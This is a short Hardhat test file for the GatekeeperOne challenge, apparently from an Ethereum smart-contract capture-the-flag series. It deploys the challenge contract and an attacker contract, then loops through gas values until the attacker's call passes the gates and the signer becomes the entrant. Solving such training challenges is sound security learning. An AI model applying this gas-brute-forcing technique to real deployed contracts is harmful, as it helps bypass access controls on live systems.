import { expect } from "chai";
import { ethers } from "hardhat";

describe("GatekeeperOne", async function () {
  // We define a fixture to reuse the same setup in every test.
  // We use loadFixture to run this setup once, snapshot that state,
  // and reset Hardhat Network to that snapshot in every test.

  //compiler config:
  // const config: HardhatUserConfig = {
  //   solidity: {
  //     version: "0.8.12",
  //     settings: {
  //       optimizer: {
  //         enabled: true,
  //         runs: 1000,
  //       },
  //     },
  //   },
  // };


  it("Should complete the function with no error", async function () {
    const [signer] = await ethers.getSigners()
    const GatekeeperOne = await ethers.getContractFactory("GatekeeperOne");
    const gatekeeperOne = await GatekeeperOne.deploy();
    await gatekeeperOne.deployed();

    const GatekeeperOneAttacker = await ethers.getContractFactory("GatekeeperOneAttacker");
    const gatekeeperOneAttacker = await GatekeeperOneAttacker.deploy(gatekeeperOne.address);

    await gatekeeperOneAttacker.deployed();

    for (let i = 5 * 8191; i < 5 * 8191 + 8191; i++) {

      try {
        await gatekeeperOneAttacker.calling(i)
        console.log('gas:' + i)
        break;
      } catch (error) {

      }
    }
    expect(await gatekeeperOne.entrant()).to.eq(signer.address)
  });

});
